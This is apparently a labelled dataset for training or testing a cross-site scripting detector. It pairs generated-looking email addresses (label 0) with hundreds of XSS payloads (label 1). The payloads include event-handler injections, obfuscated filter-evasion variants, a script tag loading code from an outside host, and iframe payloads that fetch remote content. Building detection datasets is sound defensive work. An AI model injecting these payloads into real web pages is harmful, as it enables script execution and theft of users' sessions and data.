input,label
lbiggde@diigo.com,0
gstollerydf@china.com.cn,0
salbasinydg@odnoklassniki.ru,0
ioadesdh@shutterfly.com,0
cwilemandi@china.com.cn,0
sboldrydj@icq.com,0
wguittetdk@tinypic.com,0
valendl@theguardian.com,0
ecoopdm@360.cn,0
lmarquesedn@cyberchimps.com,0
hlavisdo@usatoday.com,0
elermitdp@plala.or.jp,0
jmckennandq@imgur.com,0
dsherrdr@ucsd.edu,0
gkarolczykds@ft.com,0
gskpseydt@tinyurl.com,0
cleathleydu@privacy.gov.au,0
rgoosnelldv@examiner.com,0
narnfielddw@youku.com,0
abarnettdx@netlog.com,0
";a=prompt,a()//",1
"-eval(""window['pro'%2B'mpt'](8)"")-",1
"onclick=prompt(8)>""@x.y",1
alert`1`,1
alert&lpar;1&rpar;,1
alert&#x28;1&#x29,1
alert&#40;1&#41,1
ndoumerdy@rambler.ru,0
mbranthwaitedz@lulu.com,0
jbartosike0@netlog.com,0
mreapere1@wix.com,0
izannettie2@blogs.com,0
fporteouse3@craigslist.org,0
mpuviae4@hao123.com,0
ccalteronee5@admin.ch,0
kbattmane6@blogspot.com,0
gsyriee7@smh.com.au,0
mnazere8@desdev.cn,0
rshipperbottome9@cnbc.com,0
icurnnokea@cargocollective.com,0
remmaeb@miibeian.gov.cn,0
relwinec@shutterfly.com,0
ebenamed@bing.com,0
bebdinee@accuweather.com,0
lbreydinef@biglobe.ne.jp,0
skrzyzowskieg@guardian.co.uk,0
(alert)(1),1
"a=alert,a(1)",1
[1].find(alert),1
"top[""al""+""ert""](1)",1
top[/al/.source+/ert/.source](1),1
al\u0065rt(1),1
top['al\145rt'](1),1
top['al\x65rt'](1),1
top[8680439..toString(30)](1),1
navigator.vibrate(500),1
eval(URL.slice(-8))>#alert(1),1
eval(location.hash.slice(1)>#alert(1),1
innerHTML=location.hash>#<script>alert(1)</script>,1
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragend=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",1
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,1
"<a onkeydown=""alert(1)"" contenteditable>test</a>",1
"<a onkeypress=""alert(1)"" contenteditable>test</a>",1
"<a onkeyup=""alert(1)"" contenteditable>test</a>",1
"<a onmousedown=""alert(1)"">test</a>",1
"<a onmouseenter=""alert(1)"">test</a>",1
ktregenteh@parallels.com,0
fclericoatesei@noaa.gov,0
cpashanej@sun.com,0
iattleeek@blogtalkradio.com,0
gquestel@msu.edu,0
vgaleroem@trellian.com,0
emasselinen@biglobe.ne.jp,0
cheindleeo@miitbeian.gov.cn,0
ghullsep@ameblo.jp,0
igoodaeq@howstuffworks.com,0
cbuxyer@printfriendly.com,0
gbaumaieres@weebly.com,0
jyemmet@goo.gl,0
promeieu@tamu.edu,0
jstrowgerev@yellowpages.com,0
mmapholmew@wordpress.org,0
bpennerex@sakura.ne.jp,0
dwalwoodey@1688.com,0
hkegleyez@cdbaby.com,0
dstanbraf0@cdbaby.com,0
sdownef1@businesswire.com,0
shallowesf2@marriott.com,0
alehenmannf3@instagram.com,0
jfelderf4@nytimes.com,0
eclausenf5@youtube.com,0
hyitzhokf6@google.co.jp,0
rnoicef7@tumblr.com,0
ncoverlyf8@cornell.edu,0
htorticef9@addthis.com,0
yklimesfa@spiegel.de,0
mlangmuirfb@51.la,0
"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1
"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1
"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1
cvaliantfc@opensource.org,0
lmclayfd@elegantthemes.com,0
rmuntonfe@latimes.com,0
wskillff@purevolume.com,0
jpohlingfg@independent.co.uk,0
lmelbertfh@newyorker.com,0
tfantonettifi@mapy.cz,0
ccraykefj@oaic.gov.au,0
bpoundfk@omniture.com,0
lsandelandfl@hexun.com,0
abagnallfm@cpanel.net,0
ecrossdalefn@jalbum.net,0
rthewysfo@mapquest.com,0
trouncefp@loc.gov,0
cmcgeechanfq@oracle.com,0
mdyersfr@hao123.com,0
scossansfs@bizjournals.com,0
rserridgeft@sourceforge.net,0
lnicolfu@sitemeter.com,0
lcorryerfv@sfgate.com,0
dcloonanfw@mozilla.com,0
kmoylanfx@slideshare.net,0
rtuffsfy@hatena.ne.jp,0
cwatheyfz@instagram.com,0
atrussmang0@google.it,0
ppottipharg1@stumbleupon.com,0
aoxtebyg2@elegantthemes.com,0
jjephsong3@cyberchimps.com,0
dellisseng4@google.es,0
bbagenalg5@sfgate.com,0
cading6@latimes.com,0
tvasilechkog7@auda.org.au,0
"<wbr onmouseover=""alert(1)"">test</wbr>",1
"<wbr onmouseup=""alert(1)"">test</wbr>",1
"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>",1
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,1
<xmp id=x tabindex=1 onfocus=alert(1)></xmp>,1
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,1
"<xmp onpaste=""alert(1)"" contenteditable>test</xmp>",1
foreillyg8@freewebs.com,0
hfossordg9@dmoz.org,0
mcrombiega@columbia.edu,0
vcouchagb@stanford.edu,0
btodarellogc@smh.com.au,0
frickerbygd@webnode.com,0
lblakistonge@sciencedirect.com,0
jfieldengf@sfgate.com,0
hpavlovskygg@army.mil,0
kalwellgh@angelfire.com,0
msmalesgi@mashable.com,0
jraithmillgj@plala.or.jp,0
dthowlessgk@nbcnews.com,0
rsellorsgl@opera.com,0
rgronewaygm@bluehost.com,0
<xss id=x tabindex=1 onactivate=alert(1)></xss>,1
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>,1
<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>,1
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>,1
<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>,1
spanimangn@state.gov,0
hderechtergo@ezinearticles.com,0
kdaleygp@senate.gov,0
dhaslumgq@list-manage.com,0
gwadleygr@uiuc.edu,0
hmurrowgs@seattletimes.com,0
vhalbardgt@huffingtonpost.com,0
rgosalvezgu@eventbrite.com,0
nsymongv@edublogs.org,0
psillegw@wikimedia.org,0
swhitbreadgx@earthlink.net,0
bmcpolingy@ucoz.ru,0
bgarbettgz@telegraph.co.uk,0
pevreuxh0@samsung.com,0
igriegerh1@example.com,0
tolliveh2@ftc.gov,0
eadkinsh3@cornell.edu,0
kselborneh4@homestead.com,0
dromanh5@sbwire.com,0
jswiffenh6@cmu.edu,0
kcobainh7@about.me,0
mmansbridgeh8@mac.com,0
naggotth9@hhs.gov,0
ptroubridgeha@themeforest.net,0
drawsthornehb@un.org,0
emorrishc@mozilla.org,0
cnevillehd@microsoft.com,0
vvandevlieshe@edublogs.org,0
snellenhf@wikispaces.com,0
vfaircliffhg@ebay.co.uk,0
dtippingshh@nyu.edu,0
bstapletonhi@mac.com,0
mkeverenhj@disqus.com,0
thartshornhk@slideshare.net,0
obenamhl@tuttocitta.it,0
<xss id=x tabindex=1 onfocus=alert(1)></xss>,1
<xss id=x tabindex=1 onfocusin=alert(1)></xss>,1
hpatehm@4shared.com,0
ariglerhn@purevolume.com,0
eespyho@imageshack.us,0
mrockliffehp@zimbio.com,0
skolinskyhq@newyorker.com,0
csiggeehr@ustream.tv,0
htidburyhs@google.pl,0
dhagertyht@sciencedirect.com,0
bmacanelleyhu@meetup.com,0
gspinagehv@com.com,0
tquiltyhw@theatlantic.com,0
bjupphx@yahoo.com,0
lcasacciohy@comsenz.com,0
rgerlinghz@dropbox.com,0
tfrancescoccioi0@icq.com,0
aboiji1@ihg.com,0
atuftsi2@prlog.org,0
lroasti3@com.com,0
kboutelli4@phoca.cz,0
-prompt(8)-,1
"<area onmousemove=""alert(1)"">test</area>",1
"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>",1
"<big draggable=""true"" ondrag=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragenter=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragleave=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",1
<big id=x tabindex=1 onactivate=alert(1)></big>,1
<big id=x tabindex=1 onbeforeactivate=alert(1)></big>,1
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,1
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,1
<big id=x tabindex=1 onfocus=alert(1)></big>,1
<big id=x tabindex=1 onfocusin=alert(1)></big>,1
acollabinei5@statcounter.com,0
hpescudi6@globo.com,0
leamesi7@ameblo.jp,0
mmathivoni8@examiner.com,0
alauridseni9@fastcompany.com,0
fsherrattia@yellowpages.com,0
mmaclucaisib@wikia.com,0
mfrasconeic@simplemachines.org,0
nbaseid@bloglovin.com,0
hboshierie@51.la,0
mwarlawif@1688.com,0
gtrippittig@unicef.org,0
givyih@senate.gov,0
rmauvinii@omniture.com,0
cmazziaij@census.gov,0
awardropeik@boston.com,0
rdullardil@chronoengine.com,0
swinsperim@spiegel.de,0
jtidmasin@t.co,0
bcokerio@sina.com.cn,0
vmcsheeip@weebly.com,0
adetoileiq@accuweather.com,0
csargoodir@comsenz.com,0
fgourlayis@scribd.com,0
dpenyltonit@facebook.com,0
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragend=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragenter=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragleave=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>",1
ftwiggsiu@unesco.org,0
gyesipoviv@constantcontact.com,0
wmckertoniw@51.la,0
ajeensix@ning.com,0
challibertoniy@acquirethisname.com,0
eburkiniz@upenn.edu,0
bmelsonj0@networksolutions.com,0
amashalj1@tripadvisor.com,0
lwalesaj2@163.com,0
amccaheyj3@npr.org,0
chowarthj4@disqus.com,0
mgidneyj5@free.fr,0
crelfj6@webmd.com,0
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",1
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",1
<button id=x tabindex=1 onactivate=alert(1)></button>,1
<button id=x tabindex=1 onbeforeactivate=alert(1)></button>,1
<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>,1
<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>,1
"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",1
"<button onbeforecut=""alert(1)"" contenteditable>test</button>",1
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",1
<button onblur=alert(1) id=x></button><input autofocus>,1
"<button onclick=""alert(1)"">test</button>",1
"<button oncontextmenu=""alert(1)"">test</button>",1
"<button oncopy=""alert(1)"" contenteditable>test</button>",1
"<button oncut=""alert(1)"" contenteditable>test</button>",1
"<button ondblclick=""alert(1)"">test</button>",1
<button onfocusout=alert(1) id=x></button><input autofocus>,1
"<button onkeydown=""alert(1)"" contenteditable>test</button>",1
"<button onkeypress=""alert(1)"" contenteditable>test</button>",1
"<button onkeyup=""alert(1)"" contenteditable>test</button>",1
"<button onmousedown=""alert(1)"">test</button>",1
"<button onmouseenter=""alert(1)"">test</button>",1
"<button onmouseleave=""alert(1)"">test</button>",1
"<button onmousemove=""alert(1)"">test</button>",1
"<button onmouseout=""alert(1)"">test</button>",1
"<button onmouseover=""alert(1)"">test</button>",1
"<button onmouseup=""alert(1)"">test</button>",1
"<button onpaste=""alert(1)"" contenteditable>test</button>",1
"<canvas draggable=""true"" ondrag=""alert(1)"">test</canvas>",1
"<data onmouseleave=""alert(1)"">test</data>",1
kduckerj7@amazon.de,0
cpaceyj8@examiner.com,0
kstempej9@amazon.com,0
rsaintepaulja@hubpages.com,0
mpettmanjb@soundcloud.com,0
jvolontejc@netvibes.com,0
eleggingjd@bing.com,0
dcordellje@sohu.com,0
ahylandsjf@salon.com,0
gcamdenjg@sphinn.com,0
lmoattjh@oakley.com,0
abottellji@usa.gov,0
pabrahamsenjj@nifty.com,0
mtowjk@github.com,0
wmcbayjl@ibm.com,0
fralestonjm@boston.com,0
msadlierjn@webeden.co.uk,0
lscamadinejo@tumblr.com,0
ckeunemannjp@elpais.com,0
lnecrewsjq@lycos.com,0
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>,1
"<u onkeydown=""alert(1)"" contenteditable>test</u>",1
"<u onkeypress=""alert(1)"" contenteditable>test</u>",1
"<var oncontextmenu=""alert(1)"">test</var>",1
"<video autoplay onplaying=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video controls autoplay ontimeupdate=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video draggable=""true"" ondrag=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragend=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragleave=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragstart=""alert(1)"">test</video>",1
"<video id=x controls onfocus=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
"<video id=x controls onfocusin=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
<video id=x tabindex=1 onactivate=alert(1)></video>,1
bscudderjr@vkontakte.ru,0
mglisonjs@devhub.com,0
jladbrookejt@craigslist.org,0
hocahillju@fotki.com,0
aghentjv@yahoo.co.jp,0
htippettsjw@last.fm,0
fklimkovjx@ed.gov,0
jenevoldjy@cmu.edu,0
stampenjz@google.com.au,0
bclemettk0@is.gd,0
wtrightonk1@nhs.uk,0
dmatonink2@flickr.com,0
edysertk3@tumblr.com,0
jfoulkesk4@whitehouse.gov,0
mleysk5@sciencedirect.com,0
dackeroydk6@princeton.edu,0
"<u onkeyup=""alert(1)"" contenteditable>test</u>",1
"<u onpaste=""alert(1)"" contenteditable>test</u>",1
"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragend=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",1
fhueyk7@skyrock.com,0
psteuhlmeyerk8@blogspot.com,0
mfellneek9@cornell.edu,0
askillmanka@si.edu,0
ihowelskb@t-online.de,0
aburlesskc@mapquest.com,0
dgouthierkd@bluehost.com,0
rmaidenke@wisc.edu,0
blenourykf@dion.ne.jp,0
bpauerkg@irs.gov,0
abarehamkh@topsy.com,0
ekarolovskyki@godaddy.com,0
jrohlfskj@rakuten.co.jp,0
"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",1
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",1
"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",1
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,1
"<big onclick=""alert(1)"">test</big>",1
"<big oncontextmenu=""alert(1)"">test</big>",1
"<big oncopy=""alert(1)"" contenteditable>test</big>",1
"<big oncut=""alert(1)"" contenteditable>test</big>",1
"<big ondblclick=""alert(1)"">test</big>",1
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,1
"<big onkeydown=""alert(1)"" contenteditable>test</big>",1
"<big onkeypress=""alert(1)"" contenteditable>test</big>",1
"<big onkeyup=""alert(1)"" contenteditable>test</big>",1
"<big onmousedown=""alert(1)"">test</big>",1
"<big onmouseenter=""alert(1)"">test</big>",1
"<big onmouseleave=""alert(1)"">test</big>",1
"<big onmousemove=""alert(1)"">test</big>",1
"<big onmouseout=""alert(1)"">test</big>",1
"<big onmouseover=""alert(1)"">test</big>",1
gevasonkk@microsoft.com,0
sebbuttkl@t-online.de,0
dmallisonkm@exblog.jp,0
dossennakn@odnoklassniki.ru,0
fpochetko@ucoz.com,0
pcarnachenkp@house.gov,0
dfelgatkq@craigslist.org,0
randrzejowskikr@nps.gov,0
efluckks@dion.ne.jp,0
brobertikt@webs.com,0
zfisbburneku@columbia.edu,0
ebromwichkv@godaddy.com,0
sghionekw@miibeian.gov.cn,0
"<var onmousemove=""alert(1)"">test</var>",1
"<var onmouseout=""alert(1)"">test</var>",1
"<var onmouseover=""alert(1)"">test</var>",1
"<var onmouseup=""alert(1)"">test</var>",1
rspringettkx@epa.gov,0
blalleyky@de.vu,0
rronaldsonkz@mlb.com,0
rhailstonl0@reuters.com,0
chierrol1@wix.com,0
cparzisl2@github.com,0
bcarrettl3@gravatar.com,0
apicoppl4@yelp.com,0
"<var onmousedown=""alert(1)"">test</var>",1
"<var onmouseenter=""alert(1)"">test</var>",1
"<var onmouseleave=""alert(1)"">test</var>",1
zgilluml5@bloglovin.com,0
ashawelll6@nifty.com,0
jgrunderl7@uol.com.br,0
cbowiel8@g.co,0
igutcherl9@usda.gov,0
jshermorela@indiegogo.com,0
elackeylb@reuters.com,0
cshererlc@toplist.cz,0
cfermingerld@over-blog.com,0
cclementuccile@amazonaws.com,0
bimlenlf@facebook.com,0
vscullinlg@time.com,0
uvickerstafflh@nyu.edu,0
dfarrahli@timesonline.co.uk,0
adorwardlj@foxnews.com,0
cdymottlk@virginia.edu,0
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>,1
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,1
<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>,1
dcroxallll@tumblr.com,0
ogrigoronilm@dyndns.org,0
mwilkowskiln@facebook.com,0
kbeamentlo@disqus.com,0
dgeorgeotlp@csmonitor.com,0
nnormabelllq@irs.gov,0
mmundwelllr@ustream.tv,0
adearels@squidoo.com,0
fentreslt@youtube.com,0
zmarchamlu@multiply.com,0
dgregorowiczlv@biglobe.ne.jp,0
blambalw@go.com,0
jquinceelx@tripadvisor.com,0
enansonly@omniture.com,0
ddringlz@hud.gov,0
sbredgelandm0@twitpic.com,0
"<u onmousedown=""alert(1)"">test</u>",1
"<u onmouseenter=""alert(1)"">test</u>",1
"<u onmouseleave=""alert(1)"">test</u>",1
"<u onmousemove=""alert(1)"">test</u>",1
scutsforthm1@tmall.com,0
ctomashovm2@weather.com,0
jabadm3@nydailynews.com,0
sgrosvenorm4@tamu.edu,0
lurem5@chronoengine.com,0
mloudm6@vistaprint.com,0
swollersm7@myspace.com,0
vsimenonm8@wufoo.com,0
bhardemanm9@fastcompany.com,0
mcattowma@artisteer.com,0
bnieassmb@wikimedia.org,0
kburnyatemc@dion.ne.jp,0
fscullionmd@mit.edu,0
ffiveashme@dropbox.com,0
jbearsmoremf@slate.com,0
asingyardmg@wp.com,0
kspoerlmh@bloomberg.com,0
epegrummi@hud.gov,0
ldorrancemj@wufoo.com,0
lkiltiemk@dedecms.com,0
saggettml@imgur.com,0
dwagenenmm@1und1.de,0
vpeglermn@bbb.org,0
acolwellmo@devhub.com,0
cgibbettmp@google.com.br,0
vromemq@google.ru,0
rhynammr@miitbeian.gov.cn,0
gmiddenms@360.cn,0
"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay onplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
cgoodredmt@ibm.com,0
dsissmu@archive.org,0
fivymv@stumbleupon.com,0
gdrewsonmw@netlog.com,0
phillabymx@fastcompany.com,0
lhrinchenkomy@aol.com,0
araffanmz@desdev.cn,0
adiamentn0@feedburner.com,0
bchardinn1@kickstarter.com,0
dbomann2@spiegel.de,0
mheggsn3@biblegateway.com,0
cescoffreyn4@tinyurl.com,0
obraden5@newyorker.com,0
atrowern6@bloomberg.com,0
hgilkesn7@ehow.com,0
dhayesmann8@intel.com,0
rtownendn9@symantec.com,0
harseyna@seattletimes.com,0
nbradernb@gmpg.org,0
saspinellnc@elegantthemes.com,0
mfossordnd@seesaa.net,0
pgherardescine@tripod.com,0
amabbuttnf@themeforest.net,0
klampkinng@npr.org,0
cthysnh@prlog.org,0
hroderickni@plala.or.jp,0
edovernj@dot.gov,0
lportwainenk@google.co.jp,0
"<u onmouseout=""alert(1)"">test</u>",1
"<u onmouseover=""alert(1)"">test</u>",1
"<u onmouseup=""alert(1)"">test</u>",1
iclunienl@admin.ch,0
mbecerranm@goo.ne.jp,0
kcundenn@g.co,0
bskiplorneno@yahoo.com,0
ssallternp@posterous.com,0
abuckynq@smh.com.au,0
bclappisonnr@springer.com,0
fibbotsonns@wikia.com,0
strowbridgent@springer.com,0
bwillimottnu@hubpages.com,0
kjacobovitchnv@ftc.gov,0
kkemenw@nationalgeographic.com,0
cfittallnx@marketwatch.com,0
gchennellsny@icq.com,0
vcracienz@ask.com,0
kcapenero0@zdnet.com,0
swinchcombo1@icq.com,0
csaggso2@icq.com,0
gloddyo3@51.la,0
echowneo4@etsy.com,0
cemleno5@ftc.gov,0
bcausho6@nymag.com,0
nmcturko7@huffingtonpost.com,0
ctyreo8@delicious.com,0
camdohro9@phoca.cz,0
arycraftoa@hexun.com,0
hbrecherob@hexun.com,0
jgodainoc@sun.com,0
kpersehouseod@timesonline.co.uk,0
mgawkesoe@wikipedia.org,0
<ul id=x tabindex=1 onactivate=alert(1)></ul>,1
<ul id=x tabindex=1 onbeforeactivate=alert(1)></ul>,1
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,1
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>,1
<ul id=x tabindex=1 onfocus=alert(1)></ul>,1
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,1
jbootherstoneof@un.org,0
ghuitsonog@mit.edu,0
wlyenyngoh@ocn.ne.jp,0
seliezoi@etsy.com,0
bconneelyoj@angelfire.com,0
twipflerok@wordpress.com,0
rscarrattol@nature.com,0
rmccreedyom@desdev.cn,0
piannion@walmart.com,0
nhauxwelloo@jimdo.com,0
jfawthorpeop@springer.com,0
ostairmandoq@rakuten.co.jp,0
cblencoweor@mac.com,0
rdambrosioos@tmall.com,0
lmarhamot@lycos.com,0
lolahyou@moonfruit.com,0
sskittlesov@csmonitor.com,0
mdelionow@wix.com,0
fcloneyox@lycos.com,0
cdandoy@cmu.edu,0
mobrayoz@istockphoto.com,0
bleithharveyp0@amazon.co.uk,0
sgymlettp1@yellowbook.com,0
aratleyp2@flavors.me,0
ddelascyp3@europa.eu,0
hgutansp4@yolasite.com,0
dstancerp5@apache.org,0
"<ul oncontextmenu=""alert(1)"">test</ul>",1
"<ul oncopy=""alert(1)"" contenteditable>test</ul>",1
"<ul oncut=""alert(1)"" contenteditable>test</ul>",1
"<ul ondblclick=""alert(1)"">test</ul>",1
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,1
"<ul onkeydown=""alert(1)"" contenteditable>test</ul>",1
"<ul onkeypress=""alert(1)"" contenteditable>test</ul>",1
"<ul onpaste=""alert(1)"" contenteditable>test</ul>",1
klayburnp6@cpanel.net,0
mmoorfieldp7@unesco.org,0
wwhetsonp8@qq.com,0
rdunckleep9@amazon.co.jp,0
sashmorepa@stumbleupon.com,0
phindmorepb@telegraph.co.uk,0
awelbandpc@admin.ch,0
bbattellpd@people.com.cn,0
lbutepe@si.edu,0
doakwellpf@slashdot.org,0
vfairepg@bandcamp.com,0
bbarlaceph@amazon.co.jp,0
ecollingspi@squidoo.com,0
rwalczynskipj@cnet.com,0
rbrosolipk@utexas.edu,0
nlearmanpl@feedburner.com,0
sjoyseypm@auda.org.au,0
kmacgeffenpn@ehow.com,0
hlavalliepo@qq.com,0
tguillonpp@netscape.com,0
eludlompq@accuweather.com,0
"<sCRIpt x="">"" src=//15.rs></script>",1
<D3/OnMouSEenTer=[2].find(confirm)>z,1
"<D3""<""/OncLick=""1>[confirm``]""<"">z",1
<D3/OnpOinTeReENter=confirm``>click here,1
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",1
<Z oncut=alert()>x,1
<iFrAMe/src \/\/onload = prompt(1),1
"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",1
afilipczakpr@hao123.com,0
rgeeps@npr.org,0
cpertpt@sogou.com,0
gselbypu@dion.ne.jp,0
mclaringboldpv@redcross.org,0
jbjerkanpw@linkedin.com,0
cbarbiepx@geocities.jp,0
uraeburnpy@123-reg.co.uk,0
tdemschkepz@privacy.gov.au,0
fsorbieq0@oakley.com,0
cbeiderbeckeq1@wufoo.com,0
lchristonq2@cam.ac.uk,0
smammattq3@sohu.com,0
dwalshq4@cornell.edu,0
<var id=x tabindex=1 onbeforeactivate=alert(1)></var>,1
<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>,1
<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>,1
<var id=x tabindex=1 onfocus=alert(1)></var>,1
<var id=x tabindex=1 onfocusin=alert(1)></var>,1
jdelafoyq6@stumbleupon.com,0
mobingtonq7@thetimes.co.uk,0
gperhamq8@wunderground.com,0
dhastewellq9@livejournal.com,0
rtremellingqa@va.gov,0
hlingerqb@reference.com,0
vdunnetqc@xinhuanet.com,0
apancostqd@homestead.com,0
ebisikerqe@e-recht24.de,0
agundryqf@mac.com,0
jhinchonqg@simplemachines.org,0
tscrowtonqh@chronoengine.com,0
tdunkinsonqi@about.com,0
<image/src/onerror=prompt(8)>,1
<img/src/onerror=prompt(8)>,1
<image src/onerror=prompt(8)>,1
<img src/onerror=prompt(8)>,1
<image src =q onerror=prompt(8)>,1
<img src =q onerror=prompt(8)>,1
sgageqj@accuweather.com,0
edugglebyqk@jalbum.net,0
hledurql@123-reg.co.uk,0
enewartqm@jimdo.com,0
